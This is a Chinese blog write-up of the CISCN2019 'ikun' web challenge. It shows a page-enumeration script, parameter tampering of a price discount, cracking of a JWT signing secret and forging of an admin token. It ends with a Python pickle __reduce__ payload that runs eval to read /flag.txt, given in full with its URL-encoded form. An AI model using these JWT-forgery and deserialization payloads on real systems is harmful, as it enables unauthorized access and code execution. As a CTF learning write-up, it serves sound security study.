---

title: jwt和python的反序列化

date: 2021-05-06 22:09:56

tags: 练习

categories: test79

---
这道题是和python反序列化有关的一题：  

# [CISCN2019 华北赛区 Day1 Web2]ikun  

打开题目，可以看到让我们买一个lv6的大会员，但是要是一页一页翻是很难找到的，所以用脚本找一下。  

	import requests


	for i in range(1,1000):
    url = "http://e744a52f-9324-4429-8e29-5ec86e29d36b.node3.buuoj.cn/shop?page={}"
    url = url.format(i)
    print(url)
    r = requests.get(url)
    if "lv6.png" in r.text and r.status_code == 200:
        print("find it:" ,url)
        break  

[![](https://pic.imgdb.cn/item/6097859ad1a9ae528f1f8c10.png)](https://pic.imgdb.cn/item/6097859ad1a9ae528f1f8c10.png)  

发现是在181页，接下来就是跳转到这一页购买。   

[![](https://pic.imgdb.cn/item/6097861dd1a9ae528f25a486.png)](https://pic.imgdb.cn/item/6097861dd1a9ae528f25a486.png)  

发现明显买不起，那就抓包看一下。  

[![](https://pic.imgdb.cn/item/609786a1d1a9ae528f2bd185.png)](https://pic.imgdb.cn/item/609786a1d1a9ae528f2bd185.png)  

发现有一个变量折扣是可以更改的，那么我们直接把它改到我们能买起。  

[![](https://pic.imgdb.cn/item/609786e9d1a9ae528f2f1c96.png)](https://pic.imgdb.cn/item/609786e9d1a9ae528f2f1c96.png)  

可以看到给了我们一个新的url地址，我们登录一下。  

[![](https://pic.imgdb.cn/item/6097877dd1a9ae528f3603c6.png)](https://pic.imgdb.cn/item/6097877dd1a9ae528f3603c6.png)  

可以看到只允许admin访问，这里就涉及到第一个知识点**jwt**  

	JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。  

简单来说就是一个身份认证，它由三部分组成：header，payload，signature。  

## header

header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。  

例如：  

	{  
		"alg":"hs256",  
		"typ":"JWT"  
	}  

然后，用Base64对这个JSON编码就得到JWT的第一部分.  

## Payload

JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。

    Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。
    Public claims : 可以随意定义。
    Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明  

例如：  
	{  
		"sub":"1234567890",  
		"name":"jhon doe",
		"admin":true  
	}  

## Signature

为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。

例如：

HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。  

以上就是关于JWT生成的大致的介绍，关于生成JWT可以去官网上操作，比较简单。  

[JWT官网](https://jwt.io/)  

前面抓包时我们已经可以看到，这道题关于身份的验证时通过JWT来的，接下来就是伪造admin的jwt了，我们先解码原本的jwt。  

[![](https://pic.imgdb.cn/item/60978a11d1a9ae528f54379d.png)](https://pic.imgdb.cn/item/60978a11d1a9ae528f54379d.png)  

可以看到用户名是我自己注册的123，我们这里要改成admin，而最后一部分是经过hs256加密过的，我们可以使用工具破解得到密钥是**1Kun**  

那么接下来我们就可以到官网伪造我们的JWT了。  

[![](https://pic.imgdb.cn/item/60978af0d1a9ae528f5fca34.png)](https://pic.imgdb.cn/item/60978af0d1a9ae528f5fca34.png)  

然后用这个JWT就可以成功登录，（这里jwt在网页的cookie里，要在网页里修改）  

[![](https://pic.imgdb.cn/item/60978bafd1a9ae528f69d3ce.png)](https://pic.imgdb.cn/item/60978bafd1a9ae528f69d3ce.png)  

成功登录后看到源码下载地址，下载下来发现是python代码，其中有一个地方是python的反序列化。  

	import tornado.web
	from sshop.base import BaseHandler
	import pickle
	import urllib
	
	
	class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)  

原来python也能进行序列化和反序列化，而且有一个关于__ reduce __()魔法函数的漏洞，**具体原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。**  

下面会附上相关博客下，这里对于原理不细讲了。  

那么我们点击一件成为大会员后抓包，可以看到这个become参数我们是可以控制的，那么我们重写__ reduce __()魔法方法然后传入become，从而触发重写__ reduce __()魔法方法的漏洞  

	import pickle
	import urllib
	
	class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))    #打开读取flag.txt的内容
	
	a = pickle.dumps(payload())  #序列化payload
	a = urllib.quote(a)  #进行url编码
	print a

得到的编码是  

	c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.  

传入become就能得到flag。  

# 小结  

这道题有一个新的知识点，就是关于JWT和python的反序列化漏洞，这两个一个可以通过官网伪造，另一个有通用的payload，算是学到新知识了。  

附上学习链接   

[认识JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)  
[（Python）cPickle反序列化漏洞](https://blog.csdn.net/SKI_12/article/details/85015803)